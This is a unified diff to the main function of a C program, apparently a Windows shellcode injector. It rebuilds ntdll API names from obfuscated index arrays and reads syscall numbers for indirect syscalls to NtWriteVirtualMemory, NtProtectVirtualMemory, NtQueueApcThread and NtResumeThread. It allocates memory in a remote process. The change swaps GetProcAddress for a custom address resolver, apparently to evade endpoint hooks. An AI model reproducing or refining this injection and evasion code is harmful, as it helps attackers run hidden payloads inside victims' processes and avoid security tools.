@@ -174,7 +174,7 @@ int main(int argc, char* argv[]) {
     sysAddrNtAllocateVirtualMemory = pNtAllocateVirtualMemory + 0x12;
 
     int ntwrite_mem[] = { 39, 19, 48, 17, 8, 19, 4, 47, 8, 17, 19, 20, 0, 11, 38, 4, 12, 14, 17, 24 };
-    char* nt_write_V_mem=getoriginal(ntwrite_mem, big_string, sizeof(ntwrite_mem));
+    const char* nt_write_V_mem=getoriginal(ntwrite_mem, big_string, sizeof(ntwrite_mem));
     UINT_PTR pNtWriteVirtualMemory = (UINT_PTR)Getaddress(nt_write_V_mem, ntd);
     wNtWriteVirtualMemory = ((unsigned char*)(pNtWriteVirtualMemory + 4))[0];
     sysAddrNtWriteVirtualMemory = pNtWriteVirtualMemory + 0x12;
@@ -186,18 +186,24 @@ int main(int argc, char* argv[]) {
 
     
 
-    UINT_PTR pNtResumeThread = (UINT_PTR)GetProcAddress(hNtdll, "NtResumeThread");
+    //UINT_PTR pNtResumeThread = (UINT_PTR)GetProcAddress(hNtdll, "NtResumeThread");
+    const char* resthred="NtResumeThread";
+    UINT_PTR pNtResumeThread = (UINT_PTR)Getaddress(resthred, ntd);
     wNtResumeThread = ((unsigned char*)(pNtResumeThread + 4))[0];
     sysAddrNtResumeThread = pNtResumeThread + 0x12;
 
 
     int prtevirmem[]={39, 19, 41, 17, 14, 19, 4, 2, 19, 47, 8, 17, 19, 20, 0, 11, 38, 4, 12, 14, 17, 24};
-    UINT_PTR pNtProtectVirtualMemory = (UINT_PTR)GetProcAddress(hNtdll, getoriginal(prtevirmem, big_string, sizeof(prtevirmem)));
+    const char* ntprovirtMem=getoriginal(prtevirmem, big_string, sizeof(prtevirmem));
+    //UINT_PTR pNtProtectVirtualMemory = (UINT_PTR)GetProcAddress(hNtdll, getoriginal(prtevirmem, big_string, sizeof(prtevirmem)));
+    UINT_PTR pNtProtectVirtualMemory = (UINT_PTR)Getaddress(ntprovirtMem, ntd);
     wNtProtectVirtualMemory = ((unsigned char*)(pNtProtectVirtualMemory + 4))[0];
     sysAddrNtProtectVirtualMemory = pNtProtectVirtualMemory + 0x12;
     
     int apcqu[]={39, 19, 41, 17, 14, 19, 4, 2, 19, 47, 8, 17, 19, 20, 0, 11, 38, 4, 12, 14, 17, 24};
-    UINT_PTR pNtQueueApcThread = (UINT_PTR)GetProcAddress(hNtdll, getoriginal(apcqu, big_string, sizeof(apcqu)));
+    const char* ntqueuusrapc=getoriginal(apcqu, big_string, sizeof(apcqu));
+    //UINT_PTR pNtQueueApcThread = (UINT_PTR)GetProcAddress(hNtdll, getoriginal(apcqu, big_string, sizeof(apcqu)));
+    UINT_PTR pNtQueueApcThread = (UINT_PTR)Getaddress(ntqueuusrapc, ntd);
     wNtQueueApcThread = ((unsigned char*)(pNtQueueApcThread + 4))[0];
     sysAddrNtQueueApcThread = pNtQueueApcThread + 0x12;
 
@@ -233,9 +239,10 @@ int main(int argc, char* argv[]) {
 
     
     int virnuma[]={47, 8, 17, 19, 20, 0, 11, 26, 11, 11, 14, 2, 30, 23, 39, 20, 12, 0};
+    const char* virtalloexnum=getoriginal(virnuma, big_string, sizeof(virnuma));
     LPVOID (*pvirnuma)(HANDLE, LPVOID, SIZE_T, DWORD, DWORD, DWORD) = 
     (LPVOID(*)(HANDLE, LPVOID, SIZE_T, DWORD, DWORD, DWORD)) 
-    GetProcAddress(istfromKe__ws_ls_32, getoriginal(virnuma, big_string, sizeof(virnuma)));
+    Getaddress(virtalloexnum,ker32);
     
     PVOID remoteMemory = pvirnuma(hProcess, NULL, coolSize, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE, 0xFFFFFFFF);
 
